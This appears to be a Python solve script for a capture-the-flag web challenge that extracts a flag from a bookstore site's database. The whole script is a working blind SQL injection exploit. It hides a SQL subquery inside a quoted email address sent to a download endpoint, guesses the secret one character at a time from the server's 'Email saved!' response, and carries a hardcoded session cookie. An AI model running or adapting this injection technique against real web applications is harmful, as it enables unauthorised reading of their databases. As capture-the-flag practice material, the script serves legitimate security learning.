import sys
import string
import requests

flag = "maple{"
#flag = "maple{it_was_all_just_maple_leaf"
moji = string.ascii_lowercase + string.digits + "{}_"


##################################################
cookie = {"connect.sid": "s:EUYX-tMH___eog7tRY1D-hHrvZGTyOne.IspSYCRaRSpAAFUdtKx9NX/5+X+nmzDYTRc/Vhi6GzQ"} # Your cookie
##################################################


url = "http://bookstore.ctf.maplebacon.org/download-ebook"

while True:
    for i in moji:
        payload = {"option": "kindle", "email": f"\"',(SELECT 1 FROM books WHERE SUBSTR(texts,{len(flag) + 1},1)='{i}'AND id=1))#\"@a.sa", "bookID": "1"}
        assert(len(payload["email"]) - len("@a.sa") < 65)
        res = requests.post(url, data=payload, cookies=cookie)
        #print(i) # Debug
        #print(res.text) # Debug
        if "Email saved!" not in res.text:
            continue
        elif i == "}":
            flag += "}"
            print(flag)
            sys.exit()
        else:
            payload = {"option": "kindle", "email": f"\"',(SELECT 1 FROM books WHERE texts LIKE BINARY '%{flag[-7:] + i}%'))#\"@a.sa", "bookID": "1"}
            assert(len(payload["email"]) - len("@a.sa") < 65)
            res = requests.post(url, data=payload, cookies=cookie)
            if "Email saved!" not in res.text:
                i = i.upper()
            flag += i
            print(flag)
            break
